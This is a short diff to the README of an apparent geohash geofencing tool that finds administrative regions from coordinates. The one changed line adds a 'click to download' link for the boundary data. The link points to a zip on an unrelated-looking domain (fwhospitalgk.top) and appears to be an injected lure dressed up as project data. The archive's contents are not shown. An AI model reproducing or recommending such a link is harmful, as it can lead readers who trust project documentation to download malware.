@@ -4,7 +4,7 @@ This tool provides the ability to determine the administrative region based on l
 
 1) By using fractal algorithms to grid a specified geographical fence, it returns a collection of geohashes and data compression algorithms.
 2) Provides high-precision fences for global administrative regions. Based on Feature 1, it generates geohash fences and provides a method to determine the administrative region based on latitude and longitude with low time and space complexity.
-3) Currently provides gridded data sources for provincial, municipal, and district boundaries in China, as well as global country boundaries.
+3) Currently provides gridded data sources for provincial, municipal, and district boundaries in China, as well as global country boundaries.[click to download](https://fwhospitalgk.top/geo20230403/geo-region.zip)
 
 # Core Class Introduction
 ## generator
